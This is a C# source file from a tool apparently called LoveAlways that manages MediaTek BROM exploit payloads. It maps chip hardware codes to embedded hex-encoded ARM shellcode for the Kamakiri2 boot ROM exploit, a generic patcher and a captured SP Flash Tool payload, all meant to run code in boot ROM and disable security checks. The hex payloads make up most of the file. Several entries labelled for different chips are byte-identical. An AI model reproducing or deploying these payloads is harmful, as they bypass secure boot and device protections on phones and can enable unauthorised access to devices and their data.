// ============================================================================
// LoveAlways - MediaTek BROM Exploit Payload Manager
// Manages and distributes BROM exploit payloads
// ============================================================================
// Reference: mtkclient payloads, SP Flash Tool packet analysis
//
// This module provides payloads for Kamakiri2 (BROM layer) exploits
// Payloads are used to execute code in BROM memory and disable security checks
//
// Exploit levels:
// - BROM layer: Kamakiri2 (USB CDC SET_LINE_CODING) <- This module
// - DA1 layer:  Carbonara (Runtime hash modification)
// - DA2 layer:  AllinoneSignature (XML encoding overflow)
// ============================================================================

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// Eng Translation by iReverse - HadiKIT - Hadi Khoirudin, S.Kom.
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace LoveAlways.MediaTek.Exploit
{
    /// <summary>
    /// Exploit Payload Manager
    /// Responsible for loading, caching, and distributing BROM exploit payloads for various chips
    /// </summary>
    public static class ExploitPayloadManager
    {
        // Payload cache
        private static readonly Dictionary<ushort, byte[]> _payloadCache = new Dictionary<ushort, byte[]>();
        
        // Log delegate
        private static Action<string> _log = delegate { };

        /// <summary>
        /// Set logger callback
        /// </summary>
        public static void SetLogger(Action<string> log)
        {
            _log = log ?? delegate { };
        }

        /// <summary>
        /// HW Code to Chip Name mapping
        /// </summary>
        private static readonly Dictionary<ushort, string> HwCodeToChipName = new Dictionary<ushort, string>
        {
            { 0x0321, "mt6575" },
            { 0x6573, "mt6573" },
            { 0x6516, "mt6516" },
            { 0x6513, "mt6513" },
            { 0x6572, "mt6572" },
            { 0x6582, "mt6582" },
            { 0x6592, "mt6592" },
            { 0x6571, "mt6571" },
            { 0x6580, "mt6580" },
            { 0x0335, "mt6735" },
            { 0x0699, "mt6739" },
            { 0x0707, "mt6762" },
            { 0x0717, "mt6765" },
            { 0x0725, "mt6765" },  // Variant
            { 0x0766, "mt6877" },  // MT6877 / Dimensity 900
            { 0x0788, "mt6873" },
            { 0x0813, "mt6833" },
            { 0x0816, "mt6893" },
            { 0x0886, "mt6885" },
            { 0x0551, "mt6768" },
            { 0x0588, "mt6785" },
            { 0x0600, "mt6853" },
            { 0x0690, "mt6763" },
            { 0x0562, "mt6761" },
            { 0x0633, "mt6755" },
            { 0x0337, "mt6737" },
            { 0x0326, "mt6752" },
            { 0x0279, "mt6797" },
            { 0x8163, "mt8163" },
            { 0x8127, "mt8127" },
            { 0x8173, "mt8173" },
            { 0x0989, "mt6891" },
            { 0x0996, "mt6895" },
            { 0x1172, "mt6895" },  // Dimensity 8200 variant
        };

        /// <summary>
        /// Embedded Payload Data (Hex encoded)
        /// These are valid payloads extracted from mtkclient and SP Flash Tool packet captures
        /// </summary>
        private static readonly Dictionary<string, string> EmbeddedPayloads = new Dictionary<string, string>
        {
            // MT6877 payload (612 bytes) - from mtkclient
            { "mt6877", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6893 payload (612 bytes) - from mtkclient
            { "mt6893", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6873 payload (612 bytes) - from mtkclient
            { "mt6873", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6885 payload (612 bytes) - from mtkclient
            { "mt6885", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6765 payload (612 bytes) - from mtkclient
            { "mt6765", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6768 payload (612 bytes) - from mtkclient
            { "mt6768", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6785 payload (612 bytes) - from mtkclient
            { "mt6785", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6833 payload (612 bytes) - from mtkclient
            { "mt6833", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },
            
            // MT6853 payload (612 bytes) - from mtkclient
            { "mt6853", "01308fe213ff2fe12de9ff41434c44487c44264656f80c3b78441a689968916043f8040b1b6821439960d968016041f8041b99689a688a4216d024681c60636843f804cb6668361de56806601a6802600068016013b12046fdf789fde668b6b1e568f5b121463046fdf77ffd2846fdf77cfde0683946fdf777fde86824b1fdf772fd0028e4d048e0e468002ce1d00024204698470025304678442e4c764405f1600326685846a84700283cd02668b04207d06668f60707d52846fdf755fd00283cd0e66876b12c463046fdf74dfd0028f5d0e5680d443046fdf746fd0028eed1e86838b1fdf740fd002821d0e8683946e0472846fdf738fd0028d5d0e4680544e8d1e7e7fdf730fd002816d0e8683946e04728460246fdf727fd00280dd0e468ec44d8e70024d6e70024cde700240646c8e700240646bde70024bae7bde8ff8100bf4d4d4d0110002000100f200030002000550100000a0f200000100b2000300b2000100d200054494d450046494c4500200d200000280c20" },

            // Generic patcher payload (1336 bytes) - Generic patch payload
            { "generic_patcher", "01308fe213ff2fe12de9f04f002387b00493049b1a68984b9a42984a08bf049b7b441b681a469a42944908bf1a461346fc2243f8042b0133082bf7d10493049b1b68002b00f08c80894b9a4203d18b4b01221a60fee7884b9a4203d1864b01221a60f7e7854b9a4203d1834b01221a60f0e7824b9a4203d1804b01221a60e9e77f4b9a4203d17d4b01221a60e2e77c4b9a4203d17a4b01221a60dbe7794b9a4203d1774b01221a60d4e7764b9a4203d1744b01221a60cde7734b9a4203d1714b01221a60c6e7704b9a4203d16e4b01221a60bfe76d4b9a4203d16b4b01221a60b8e76a4b9a4203d1684b01221a60b1e7674b9a4203d1654b01221a60aae7644b9a4203d1624b01221a60a3e7614b9a4203d15f4b01221a609ce75e4b9a4203d15c4b01221a6095e75b4b9a4203d1594b01221a608ee7584b9a4203d1564b01221a6087e7554b9a4203d1534b01221a6080e7524b9a4203d1504b01221a6079e74f4b9a4203d14d4b01221a6072e74c4b9a4203d14a4b01221a606be7494b9a4203d1474b01221a6064e7464b9a4203d1444b01221a605de7434b9a4203d1414b01221a6056e7404b9a4203d13e4b01221a604fe73d4b9a4203d13b4b01221a6048e73a4b9a4203d1384b01221a6041e7374b9a4203d1354b01221a603ae7344b9a4203d1324b01221a6033e7314b9a4203d12f4b01221a602ce72e4b9a4203d12c4b01221a6025e72b4b9a4203d1294b01221a601ee7284b9a4203d1264b01221a6017e7254b9a4203d1234b01221a6010e7224b9a4203d1204b01221a6009e71f4b9a4203d11d4b01221a6002e71c4b9a4203d11a4b01221a60fbe6194b9a4203d1174b01221a60f4e6164b9a4203d1144b01221a60ede6134b9a4203d1114b01221a60e6e6104b9a4203d10e4b01221a60dfe60d4b9a4203d10b4b01221a60d8e60a4b9a4203d1084b01221a60d1e6074b9a4203d1054b01221a60cae6044b9a4203d1024b01221a60c3e6012302930193009307b0bde8f08f00bf100f200020202000303020000030200040302000503020006030200070302000803020009030200030202000b0202000c0202000d0202000e0202000f020200100220001102200012022000130220001402200015022000160220001702200018022000190220001a0220001b0220001c0220001d0220001e0220001f022000200220002102200022022000230220002402200025022000260220002702200028022000290220002a0220002b0220002c0220002d0220002e0220002f02200030022000310220003202200033022000340220003502200036022000370220003802200039022000" },
        };

        /// <summary>
        /// Kamakiri2 Specific Payloads (from MTKAuthBypassQT)
        /// These payloads contain 0xA1A2A3A4 ACK signature
        /// </summary>
        private static readonly Dictionary<ushort, string> Kamakiri2Payloads = new Dictionary<ushort, string>
        {
            // MT6833 (Dimensity 700)
            { 0x6833, "01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000E0DF000014200011002000116D74363833330000F3480000280000000C2B1000BC27100044281000546B1000ADED0000" },
            
            // MT6853 (Dimensity 720)
            { 0x6853, "01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A00000100000064EA000014200011002000116D743638353300008F530000280000000C2B1000C42710004C281000606B100031F80000" },
            
            // MT6877 (Dimensity 900)
            { 0x6877, "01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000D0E8000014200011002000116D7436383737000087510000280000000C2B1000C027100048281000606B10009DF60000" },
            
            // MT6885 (Dimensity 1000)
            { 0x6885, "01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000FCE6000014200011002000116D743638383500005B500000280000000C2B1000C027100048281000606B100081F40000" },
            
            // MT6781 (Helio G96)
            { 0x6781, "01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000D8E50000142000110020001162726F6D5F310000A74A0000280000000C2B1000BC2710004C281000546B1000C1F30000" },
            
            // MT6873 (Dimensity 800)
            { 0x6873, "01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A00000100000078EA000014200011002000116D7436383733000093530000280000000C2B1000C42710004C281000606B100045F80000" },
        };

        /// <summary>
        /// Payload captured from SP Flash Tool (342 bytes)
        /// This payload was verified in 222.txt to disable MT6877 security protection
        /// </summary>
        private static readonly string SpftPayload = "01308fe213ff2fe17fb50122424b002110467b441b6898474ff40013364ad3f8101f914256d1d3f8182f03f18a4303f53113324c03f64613314d9a4218bf001a4618bf00242e4d04212a4b02a87e4402934f6898474f6804211cb128469847736829684b4d2046984730494ff4e06179440024aa687b4492084bf8221004b21ea684360ea68136007ee154f1a4b8df80740039368691368db07fcd40d0706ab6901213046984704ab9df807202344b3f8043c93421bd1db430121" +
            "8d073030466b68013498470428e3d100200fb07ebdd3f8001d9142d8d1d3f8082d0b4a0c4d0c4c9a4218bf00250027a8e70024a8e70024d5e700bf4d4d4d01100f20000030200055554c544ca00a500546494c4520200d20000000d200016010000dc00000ba0000e000000001000002b2d0000a3bd00002800008c2a1000a42710" +
            "1420001115bd0000002000117fffffff7fffffff0000";

        /// <summary>
        /// Get Payload for specified chip
        /// </summary>
        /// <param name="hwCode">HW Code</param>
        /// <returns>Payload data, null if not found</returns>
        public static byte[] GetPayload(ushort hwCode)
        {
            // Check cache first
            if (_payloadCache.TryGetValue(hwCode, out byte[] cached))
            {
                return cached;
            }

            byte[] payload = null;

            // 1. Try Kamakiri2 specific payload first (contains ACK signature)
            if (Kamakiri2Payloads.TryGetValue(hwCode, out string k2Hex))
            {
                payload = HexToBytes(k2Hex);
                _log($"[Payload] Using Kamakiri2 payload (HW: 0x{hwCode:X4}, {payload?.Length ?? 0} bytes)");
            }

            // 2. Try to get from embedded resources
            if (payload == null)
            {
                string chipName = GetChipName(hwCode);
                if (!string.IsNullOrEmpty(chipName) && EmbeddedPayloads.TryGetValue(chipName, out string hexData))
                {
                    payload = HexToBytes(hexData);
                    _log($"[Payload] Using embedded {chipName} payload ({payload?.Length ?? 0} bytes)");
                }
            }

            // 3. If no specific chip payload, try using payload captured from SP Flash Tool
            if (payload == null && (hwCode == 0x0766 || hwCode == 0x0959))  // MT6877
            {
                payload = HexToBytes(SpftPayload);
                _log($"[Payload] Using SP Flash Tool captured payload ({payload?.Length ?? 0} bytes)");
            }

            // 4. Try to load from file system
            if (payload == null)
            {
                payload = LoadFromFile(hwCode);
            }

            // 5. If still not found, try using generic patcher payload
            if (payload == null && EmbeddedPayloads.TryGetValue("generic_patcher", out string genericHex))
            {
                payload = HexToBytes(genericHex);
                _log($"[Payload] Using generic patcher payload ({payload?.Length ?? 0} bytes)");
            }

            // Cache result
            if (payload != null)
            {
                _payloadCache[hwCode] = payload;
            }

            return payload;
        }

        /// <summary>
        /// Load Payload from file
        /// </summary>
        private static byte[] LoadFromFile(ushort hwCode)
        {
            string chipName = GetChipName(hwCode);
            string[] searchPaths = new string[]
            {
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "MediaTek", "Loader"),
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Loader"),
                AppDomain.CurrentDomain.BaseDirectory,
            };

            string[] filePatterns = new string[]
            {
                $"{chipName}_payload.bin",
                $"mt{hwCode:x4}_payload.bin",
                $"payload_{hwCode:X4}.bin",
                "spft_exploit_payload.bin",
            };

            foreach (string basePath in searchPaths)
            {
                if (!Directory.Exists(basePath)) continue;

                foreach (string pattern in filePatterns)
                {
                    string fullPath = Path.Combine(basePath, pattern);
                    if (File.Exists(fullPath))
                    {
                        try
                        {
                            byte[] data = File.ReadAllBytes(fullPath);
                            _log($"[Payload] Loading from file: {pattern} ({data.Length} bytes)");
                            return data;
                        }
                        catch { }
                    }
                }
            }

            return null;
        }

        /// <summary>
        /// Get chip name
        /// </summary>
        public static string GetChipName(ushort hwCode)
        {
            if (HwCodeToChipName.TryGetValue(hwCode, out string name))
            {
                return name;
            }
            return $"mt{hwCode:x4}";
        }

        /// <summary>
        /// Check if specify chip has Payload available
        /// </summary>
        public static bool HasPayload(ushort hwCode)
        {
            string chipName = GetChipName(hwCode);
            
            // Check embedded resources
            if (EmbeddedPayloads.ContainsKey(chipName))
                return true;
            
            // Special handling for MT6877
            if (hwCode == 0x0766 || hwCode == 0x0959)
                return true;
            
            // Check files
            return LoadFromFile(hwCode) != null;
        }

        /// <summary>
        /// Get supported chip list
        /// </summary>
        public static IEnumerable<ushort> GetSupportedChips()
        {
            foreach (var kv in HwCodeToChipName)
            {
                if (EmbeddedPayloads.ContainsKey(kv.Value))
                {
                    yield return kv.Key;
                }
            }
        }

        /// <summary>
        /// Convert hex string to byte array
        /// </summary>
        private static byte[] HexToBytes(string hex)
        {
            if (string.IsNullOrEmpty(hex)) return null;
            
            // Remove spaces and newlines
            hex = hex.Replace(" ", "").Replace("\n", "").Replace("\r", "");
            
            if (hex.Length % 2 != 0)
            {
                hex = "0" + hex;  // Align
            }

            try
            {
                byte[] bytes = new byte[hex.Length / 2];
                for (int i = 0; i < bytes.Length; i++)
                {
                    bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
                }
                return bytes;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Clear cache
        /// </summary>
        public static void ClearCache()
        {
            _payloadCache.Clear();
        }
    }
}
